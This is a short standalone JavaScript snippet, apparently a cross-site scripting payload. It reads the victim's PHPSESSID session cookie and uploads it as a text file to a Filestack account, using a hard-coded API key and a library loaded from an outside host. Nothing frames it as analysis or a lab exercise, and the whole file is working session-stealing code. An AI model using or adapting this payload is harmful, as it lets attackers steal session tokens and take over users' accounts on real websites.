var session = document.cookie.match(/PHPSESSID=(\w+)/);
var sessionSave = session ? session[1] : '';
var blob = new Blob([JSON.stringify(sessionSave)], { type: 'text/plain' });

var script = document.createElement('script');
script.src = 'https://static.filestackapi.com/filestack-js/3.x.x/filestack.min.js';
script.onload = function() {
  var client = filestack.init('AHaSBB7sZSe6Qg8OeRRp5z');

  var fileName = 'session_' + Date.now() + '.txt';

  client.upload(blob, { filename: fileName })
    .then(response => {
      var fileUrl = response.url;
      console.log('File Upload:', fileUrl);
    })
    .catch(error => {
      console.error('Error:', error);
    });
};

document.head.appendChild(script);